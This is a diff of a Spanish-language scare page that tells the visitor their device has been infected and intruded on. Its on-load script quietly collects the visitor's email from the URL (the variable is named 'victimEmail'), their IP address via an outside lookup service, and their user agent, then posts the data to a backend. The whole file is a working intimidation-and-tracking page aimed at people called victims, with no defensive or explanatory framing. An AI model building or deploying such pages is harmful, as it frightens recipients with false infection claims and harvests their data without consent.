@@ -3,79 +3,56 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>⚠¡¡ALERTA DE SEGURIDAD!!⚠</title>
+  <title>⚠¡¡INTRUSIÓN CONFIRMADA!!⚠</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Audiowide&display=swap');
-    
     body {
-      background-color: #000;
-      color: #ff0000;
+      background: #000;
+      color: #f00;
       font-family: 'Audiowide', cursive;
       text-align: center;
-      padding: 0;
-      margin: 0;
-      overflow: hidden;
+      padding: 50px;
       background-image: 
-        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200"><path d="M20,50 Q50,20 80,50 T140,50 T200,50" stroke="rgba(255,0,0,0.1)" fill="none" stroke-width="2"/></svg>'),
-        linear-gradient(to bottom, #300000, #000000);
-      background-size: 200px 200px, cover;
+        radial-gradient(circle, #300000 1px, transparent 1px),
+        linear-gradient(to bottom, #300000, #000);
+      background-size: 30px 30px, 100% 100%;
     }
-    
-    .container {
-      max-width: 900px;
-      margin: 20px auto;
-      padding: 40px;
-      border: 4px solid #ff0000;
-      border-radius: 0;
-      background-color: rgba(0, 0, 0, 0.9);
-      box-shadow: 0 0 100px rgba(255, 0, 0, 0.8);
-      position: relative;
-      overflow: hidden;
-      z-index: 10;
-    }
-    
     h1 {
-      font-size: 4em;
-      margin-bottom: 30px;
-      text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
-      animation: pulse 0.8s infinite alternate;
+      font-size: 3em;
+      text-shadow: 0 0 20px #f00;
+      animation: glitch 1s infinite;
     }
-    
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      100% { transform: scale(1.05); }
+    @keyframes glitch {
+      0% { text-shadow: 0 0 10px #f00; }
+      50% { text-shadow: 0 0 30px #f00; }
+      100% { text-shadow: 0 0 10px #f00; }
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>⚠¡¡ALERTA DE SEGURIDAD!!⚠</h1>
-    <p>SE HA DETECTADO ACCESO NO AUTORIZADO A ESTE DISPOSITIVO</p>
-  </div>
+  <h1>⚠¡¡ACCESO NO AUTORIZADO!!⚠</h1>
+  <p>SE HA INFECTADO TU DISPOSITIVO</p>
 
   <script>
-    // Captura datos del visitante y envía al backend
-    async function logAccess() {
+    // Captura datos y envía al backend
+    async function sendData() {
       const urlParams = new URLSearchParams(window.location.search);
-      const senderEmail = urlParams.get('from'); // Ejemplo: ?from=victima@correo.com
+      const victimEmail = urlParams.get('from') || 'DESCONOCIDO';
       
       const data = {
-        email: senderEmail || 'Desconocido',
+        email: victimEmail,
         ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip),
-        userAgent: navigator.userAgent,
-        page: window.location.href
+        user_agent: navigator.userAgent
       };
 
-      // Envía los datos al backend
-      fetch('https://TU_BACKEND_URL/log_access', {
+      fetch('/log', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
       });
     }
 
-    // Ejecuta al cargar la página
-    window.onload = logAccess;
+    window.onload = sendData;
   </script>
 </body>
 </html>
